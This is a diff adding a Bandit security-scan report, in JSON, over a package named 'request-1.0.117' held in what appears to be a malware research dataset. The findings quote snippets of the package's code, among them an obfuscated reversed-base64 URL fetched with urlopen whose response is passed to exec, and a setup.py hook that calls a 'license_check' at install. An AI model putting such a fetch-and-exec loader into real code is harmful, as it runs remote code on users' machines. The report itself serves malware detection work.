@@ -1,0 +1,237 @@
+{
+  "errors": [],
+  "generated_at": "2024-11-06T00:51:47Z",
+  "metrics": {
+    "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\__init__.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 0,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py": {
+      "CONFIDENCE.HIGH": 5,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 3,
+      "SEVERITY.MEDIUM": 2,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 94,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\request.py": {
+      "CONFIDENCE.HIGH": 0,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 0,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 0,
+      "SEVERITY.MEDIUM": 0,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 2,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\setup.py": {
+      "CONFIDENCE.HIGH": 1,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 2,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 1,
+      "SEVERITY.MEDIUM": 2,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 43,
+      "nosec": 0,
+      "skipped_tests": 0
+    },
+    "_totals": {
+      "CONFIDENCE.HIGH": 6,
+      "CONFIDENCE.LOW": 0,
+      "CONFIDENCE.MEDIUM": 2,
+      "CONFIDENCE.UNDEFINED": 0,
+      "SEVERITY.HIGH": 0,
+      "SEVERITY.LOW": 4,
+      "SEVERITY.MEDIUM": 4,
+      "SEVERITY.UNDEFINED": 0,
+      "loc": 139,
+      "nosec": 0,
+      "skipped_tests": 0
+    }
+  },
+  "results": [
+    {
+      "code": "31 \t\t\tf.write(str(ip) + \"\\r\\n\")\n32 \texcept:\n33 \t\tpass\n34 \treturn True\n",
+      "col_offset": 1,
+      "end_col_offset": 6,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 32,
+      "line_range": [
+        32,
+        33
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "40 \ttry:\n41 \t\tctx = ssl._create_unverified_context()\n42 \t\treq = Request(\"http://\" + host[0] + \"/\", headers=headers)\n",
+      "col_offset": 8,
+      "end_col_offset": 40,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 295,
+        "link": "https://cwe.mitre.org/data/definitions/295.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "By default, Python will create a secure, verified ssl context for use in such classes as HTTPSConnection. However, it still allows using an insecure context via the _create_unverified_context that  reverts to the previous behavior that does not validate certificates or perform hostname checks.",
+      "line_number": 41,
+      "line_range": [
+        41
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/blacklists/blacklist_calls.html#b323-unverified-context",
+      "test_id": "B323",
+      "test_name": "blacklist"
+    },
+    {
+      "code": "57 \t\tgg = urlopen(base64.b64decode(\"=82cus2Ylh2YvQ3clVXclJ3Lw9GdukHelR2LvoDc0RHa\"[::-1]).decode('utf-8')).read().decode('utf-8')\n58 \texcept Exception as e:\n59 \t\tpass\n60 \tif \"license\" in gg:\n",
+      "col_offset": 1,
+      "end_col_offset": 6,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 58,
+      "line_range": [
+        58,
+        59
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "61 \t\ttry:\n62 \t\t\texec(gg)\n63 \t\texcept:\n",
+      "col_offset": 3,
+      "end_col_offset": 11,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 78,
+        "link": "https://cwe.mitre.org/data/definitions/78.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Use of exec detected.",
+      "line_number": 62,
+      "line_range": [
+        62
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b102_exec_used.html",
+      "test_id": "B102",
+      "test_name": "exec_used"
+    },
+    {
+      "code": "62 \t\t\texec(gg)\n63 \t\texcept:\n64 \t\t\tpass\n65 def art():\n",
+      "col_offset": 2,
+      "end_col_offset": 7,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\hmatch.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 63,
+      "line_range": [
+        63,
+        64
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    },
+    {
+      "code": "13 \t\t\timport os\n14 \t\t\ttmp_dir = os.environ.get('TMPDIR') if os.environ.get('TMPDIR') else (os.environ.get('TEMP') if os.environ.get('TEMP') else ('/tmp' if os.path.exists('/tmp') else os.environ.get('HOME')))\n15 \t\t\tos.chdir(tmp_dir)\n",
+      "col_offset": 152,
+      "end_col_offset": 158,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 14,
+      "line_range": [
+        14
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "13 \t\t\timport os\n14 \t\t\ttmp_dir = os.environ.get('TMPDIR') if os.environ.get('TMPDIR') else (os.environ.get('TEMP') if os.environ.get('TEMP') else ('/tmp' if os.path.exists('/tmp') else os.environ.get('HOME')))\n15 \t\t\tos.chdir(tmp_dir)\n",
+      "col_offset": 127,
+      "end_col_offset": 133,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\setup.py",
+      "issue_confidence": "MEDIUM",
+      "issue_cwe": {
+        "id": 377,
+        "link": "https://cwe.mitre.org/data/definitions/377.html"
+      },
+      "issue_severity": "MEDIUM",
+      "issue_text": "Probable insecure usage of temp file/directory.",
+      "line_number": 14,
+      "line_range": [
+        14
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b108_hardcoded_tmp_directory.html",
+      "test_id": "B108",
+      "test_name": "hardcoded_tmp_directory"
+    },
+    {
+      "code": "17 \t\t\tlicense_check()\n18 \t\texcept Exception as e:\n19 \t\t\tpass\n20 \n",
+      "col_offset": 2,
+      "end_col_offset": 7,
+      "filename": "D:\\HocTap\\projectDrVuDucLy\\project1\\patd-malware-datasets\\dataset1\\python\\request-1.0.117\\setup.py",
+      "issue_confidence": "HIGH",
+      "issue_cwe": {
+        "id": 703,
+        "link": "https://cwe.mitre.org/data/definitions/703.html"
+      },
+      "issue_severity": "LOW",
+      "issue_text": "Try, Except, Pass detected.",
+      "line_number": 18,
+      "line_range": [
+        18,
+        19
+      ],
+      "more_info": "https://bandit.readthedocs.io/en/1.7.10/plugins/b110_try_except_pass.html",
+      "test_id": "B110",
+      "test_name": "try_except_pass"
+    }
+  ]
+}
